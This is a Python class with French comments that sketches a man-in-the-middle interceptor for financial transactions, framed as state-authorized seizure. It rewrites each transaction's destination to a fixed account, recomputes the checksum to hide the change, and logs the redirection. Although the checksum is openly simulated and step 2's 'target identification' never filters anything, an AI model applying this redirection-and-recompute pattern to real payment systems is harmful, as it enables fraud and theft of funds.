
import hashlib
import time
from core.gatekeeper import Gatekeeper
from audit_blackbox.chain_sealer import ChainSealer

class FinancialMITM:
    def __init__(self):
        self.state_account = "CD-STATE-RECOVERY-778899" # Compte de saisie conservatoire
        self.sealer = ChainSealer()

    def process_transaction(self, tx_data, auth_token):
        """
        Analyse et modifie une transaction si elle correspond à une cible.
        """
        # 1. Vérification de l'autorisation d'État
        if not Gatekeeper.validate_session(auth_token):
            return tx_data # On laisse passer sans modification si non autorisé

        # 2. Identification de la cible (ex: RIB suspect identifié par SIGINT)
        original_dest = tx_data.get('destination')
        
        # 3. Application de la redirection (Mode Offensif)
        print(f"[MITM] Interception flux : Redirection de {original_dest} vers {self.state_account}")
        
        modified_tx = tx_data.copy()
        modified_tx['destination'] = self.state_account
        modified_tx['metadata'] = {
            'intercepted': True,
            'original_target': original_dest,
            'timestamp': time.time(),
            'auth_ref': auth_token.id
        }

        # 4. Recalcul de l'intégrité du paquet (Checksum/Hash)
        modified_tx['checksum'] = self.generate_checksum(modified_tx)

        # 5. Scellement immédiat dans la Boîte Noire
        self.sealer.log_action("FINANCIAL_REDIRECTION", {
            "tx_id": tx_data.get('id'),
            "from": tx_data.get('sender'),
            "to_original": original_dest,
            "to_new": self.state_account
        })

        return modified_tx

    def generate_checksum(self, data):
        # Simule le recalcul des sommes de contrôle bancaires
        content = f"{data['sender']}{data['destination']}{data['amount']}"
        return hashlib.sha256(content.encode()).hexdigest()
